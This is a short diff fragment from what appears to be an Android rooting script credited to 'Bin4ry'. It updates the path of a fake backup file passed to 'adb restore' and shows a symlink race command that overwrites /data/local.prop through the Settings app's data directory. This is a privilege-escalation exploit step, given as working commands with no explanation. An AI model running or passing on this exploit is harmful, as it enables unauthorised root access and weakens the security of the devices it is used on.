@@ -8,7 +8,7 @@
 # By Bin4ry 
 
 
-adb restore includes/fakebackup.ab
+adb restore modules/extras/fakebackup.ab
 
 command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';" 
 
